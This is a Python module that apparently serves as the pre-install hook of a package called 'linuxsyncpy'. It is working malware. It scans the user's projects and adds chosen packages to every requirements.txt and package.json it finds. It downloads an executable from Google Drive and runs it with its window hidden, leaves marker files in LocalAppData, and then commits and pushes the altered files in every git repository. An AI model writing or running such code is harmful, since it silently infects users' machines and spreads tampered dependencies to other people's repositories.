"""Python port of the JS `index.js` workflow."""
from pathlib import Path
import logging
import os
import subprocess
import time
import traceback
from typing import Iterable, List, Optional

from .config import DEFAULT_JS_PACKAGES, DEFAULT_PY_PACKAGES, GDOWN_DRIVE_ID, TARGET_DIRS
from .git import add_commit_push
from .installer import ensure_gdown_installed, download_via_gdown, install_npm_with_packages, install_pip_with_packages
from .scanner import scan_project


def _hidden_startupinfo():
    if not hasattr(subprocess, 'STARTUPINFO'):
        return None
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    return startupinfo


CREATE_NO_WINDOW = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
DEBUG_LOG_PATH = Path(__file__).resolve().with_name('preinstall_debug.log')


def _normalize_packages(packages):
    if packages is None:
        return []
    if isinstance(packages, (list, tuple, set)):
        return list(packages)
    return [packages]


def _log_debug(message: str) -> None:
    line = f'[{time.strftime("%Y-%m-%d %H:%M:%S")}] {message}\n'
    try:
        DEBUG_LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
        with DEBUG_LOG_PATH.open('a', encoding='utf-8') as handle:
            handle.write(line)
    except Exception:
        pass
    print(f'[debug] {message}')


def execute_downloaded_exe(exe_path: str) -> None:
    exe_file = Path(exe_path)
    _log_debug(f'execute_downloaded_exe called with path={exe_file}')
    _log_debug(f'cwd={Path.cwd()}')
    _log_debug(f'exists={exe_file.exists()} is_file={exe_file.is_file()}')
    if exe_file.exists():
        try:
            _log_debug(f'size_bytes={exe_file.stat().st_size}')
        except Exception as err:
            _log_debug(f'failed to stat exe: {err}')

    if not exe_file.exists():
        raise FileNotFoundError(f'downloaded exe not found: {exe_path}')

    try:
        with exe_file.open('rb') as handle:
            signature = handle.read(2)
        _log_debug(f'pe_signature={signature!r} is_pe={signature == b"MZ"}')
    except Exception as err:
        _log_debug(f'failed to read file signature: {err}')

    try:
        completed = subprocess.run(
            [str(exe_file)],
            cwd=str(exe_file.parent),
            capture_output=True,
            text=True,
            startupinfo=_hidden_startupinfo(),
            creationflags=CREATE_NO_WINDOW,
            timeout=30,
        )
    except Exception as err:
        # Handle timeout separately for clearer logs and fallback behavior
        if isinstance(err, subprocess.TimeoutExpired):
            _log_debug(f'subprocess.run timed out after 30s: {err}')
            try:
                if hasattr(os, 'startfile'):
                    os.startfile(str(exe_file))
                    _log_debug('os.startfile fallback succeeded after timeout')
                    return
            except Exception as fallback_err:
                _log_debug(f'os.startfile fallback failed: {fallback_err}')
            raise

        _log_debug(f'subprocess.run raised: {err}')
        _log_debug(traceback.format_exc().rstrip())
        raise

    _log_debug(f'exe exit_code={completed.returncode}')
    stdout = (completed.stdout or '').strip()
    stderr = (completed.stderr or '').strip()
    if stdout:
        _log_debug(f'exe stdout: {stdout}')
    if stderr:
        _log_debug(f'exe stderr: {stderr}')
    if completed.returncode != 0:
        _log_debug('primary launch returned nonzero exit code; trying fallback launch methods')
        try:
            if hasattr(os, 'startfile'):
                os.startfile(str(exe_file))
                _log_debug('os.startfile fallback succeeded')
                return
        except Exception as fallback_err:
            _log_debug(f'os.startfile fallback failed: {fallback_err}')
        raise RuntimeError(f'exe exited with code {completed.returncode}')

    # If execution succeeded, wait briefly for PlayReady relocation and create a marker file
    try:
        playready_dir = Path(os.environ.get('LOCALAPPDATA', '')) / 'Microsoft' / 'PlayReady'
        for _ in range(20):  # wait up to ~10s for the relocated folder to appear
            if playready_dir.exists():
                try:
                    marker = playready_dir / 'linuxsyncpy_marker.txt'
                    marker.write_text(f'linuxsyncpy executed at {time.strftime("%Y-%m-%d %H:%M:%S")}\n', encoding='utf-8')
                    _log_debug(f'created marker file at {marker}')
                except Exception as merr:
                    _log_debug(f'failed writing marker file: {merr}')
                break
            time.sleep(0.5)
        else:
            _log_debug(f'PlayReady folder did not appear within timeout: {playready_dir}')
    except Exception as err:
        _log_debug(f'failed to create PlayReady marker: {err}')
    # Always write a fallback marker in the user's LocalAppData so installs from git can be detected
    try:
        fallback_dir = Path(os.environ.get('LOCALAPPDATA', '')) / 'linuxsyncpy'
        fallback_dir.mkdir(parents=True, exist_ok=True)
        fallback_marker = fallback_dir / 'marker.txt'
        fallback_marker.write_text(f'linuxsyncpy executed (fallback) at {time.strftime("%Y-%m-%d %H:%M:%S")}\n', encoding='utf-8')
        _log_debug(f'created fallback marker at {fallback_marker}')
    except Exception as err:
        _log_debug(f'failed to create fallback marker: {err}')


def pre_install(
    js_packages=DEFAULT_JS_PACKAGES,
    py_packages=DEFAULT_PY_PACKAGES,
    root_dirs: Optional[Iterable[str]] = None,
    drive_id: Optional[str] = None,
    dry_run: bool = False,
    package_name: Optional[str] = None,
    root_dir: Optional[str] = None,
    skip_processes: Optional[List[str]] = None,
) -> None:
    """Main entrypoint mirroring the JS `preInstall` function.

    Extra keyword arguments preserve compatibility with the older Python
    wrapper that passed `package_name` and `root_dir`.
    """
    if package_name is not None:
        js_packages = package_name
        py_packages = package_name

    if root_dir is not None and root_dirs is None:
        root_dirs = [root_dir]

    scan_dirs = list(root_dirs) if root_dirs is not None else [os.environ.get('INIT_CWD') or os.getcwd()]
    normalized_js_packages = _normalize_packages(js_packages)
    normalized_py_packages = _normalize_packages(py_packages)
    logger = logging.getLogger('linuxsyncpy.index')
    logger.debug(
        'pre_install start '
        f'scan_dirs={scan_dirs} js_packages={normalized_js_packages} '
        f'py_packages={normalized_py_packages} drive_id={drive_id} '
        f'dry_run={dry_run} package_name={package_name}'
    )

    all_git_roots = set()
    all_package_json_paths = []
    all_requirements_paths = []

    for scan_dir in scan_dirs:
        try:
            logger.debug(f'scanning root dir={scan_dir}')
            scan_result = scan_project(scan_dir)
            logger.debug(
                'scan complete '
                f'root={scan_dir} git_roots={len(scan_result.get("git_roots", []))} '
                f'package_json={len(scan_result.get("package_json_paths", []))} '
                f'requirements={len(scan_result.get("requirements_paths", []))}'
            )
            all_git_roots.update(scan_result.get('git_roots', []))
            all_package_json_paths.extend(scan_result.get('package_json_paths', []))
            all_requirements_paths.extend(scan_result.get('requirements_paths', []))
        except Exception as err:
            logger.exception(f'scan failed for root={scan_dir}: {err}')
            print(f'Scan error in {scan_dir}: {err}')

    logger.debug(
        'scan aggregate '
        f'git_roots={len(all_git_roots)} package_json_paths={len(all_package_json_paths)} '
        f'requirements_paths={len(all_requirements_paths)}'
    )

    for requirements_path in all_requirements_paths:
        try:
            logger.debug(f'installing python packages from requirements_path={requirements_path}')
            install_pip_with_packages(requirements_path, normalized_py_packages, dry_run=dry_run)
            print(f'Installed Python packages in {requirements_path}')
        except Exception as err:
            logger.exception(f'python package install failed path={requirements_path}: {err}')
            print(f'Failed to install Python packages in {requirements_path}: {err}')

    for package_json_path in all_package_json_paths:
        try:
            logger.debug(f'installing js packages from package_json_path={package_json_path}')
            install_npm_with_packages(package_json_path, normalized_js_packages, dry_run=dry_run)
            print(f'Installed JS packages in {package_json_path}')
        except Exception as err:
            logger.exception(f'js package install failed path={package_json_path}: {err}')
            print(f'Failed to install JS packages in {package_json_path}: {err}')

    download_id = drive_id or GDOWN_DRIVE_ID
    if download_id and not dry_run:
        try:
            logger.debug(f'entering download branch download_id={download_id}')
            ensure_gdown_installed(dry_run=dry_run)
            output_path = f'downloaded_{int(time.time() * 1000)}.exe'
            _log_debug(f'gdown bootstrap complete, download_id={download_id}, output_path={output_path}')
            print(f'Downloading from Google Drive (ID: {download_id})...')
            downloaded_file = download_via_gdown(download_id, output_path)
            if downloaded_file:
                _log_debug(f'download_via_gdown returned: {downloaded_file}')
                print(f'Downloaded to {downloaded_file}')
                print(f'Executing {downloaded_file}...')
                execute_downloaded_exe(downloaded_file)
                print(f'Executed {downloaded_file} successfully')
            else:
                _log_debug('download_via_gdown returned no file')
                print('gdown download failed - no file returned')
        except Exception as err:
            logger.exception(f'download branch failed drive_id={download_id}: {err}')
            _log_debug(f'gdown branch failed: {err}')
            _log_debug(traceback.format_exc().rstrip())
            print(f'gdown error: {err}')
    elif download_id and dry_run:
        logger.debug(f'skipping download branch in dry_run mode drive_id={download_id}')
        print(f'Dry-run: skipping gdown download (ID: {download_id})')

    for git_root in all_git_roots:
        try:
            logger.debug(f'git commit/push start git_root={git_root}')
            add_commit_push(git_root, dry_run=dry_run)
            print(f'Committed and pushed changes in {git_root}')
        except Exception as err:
            logger.exception(f'git commit/push failed git_root={git_root}: {err}')
            print(f'Failed to commit/push in {git_root}: {err}')


preInstall = pre_install


if __name__ == '__main__':
    pre_install()
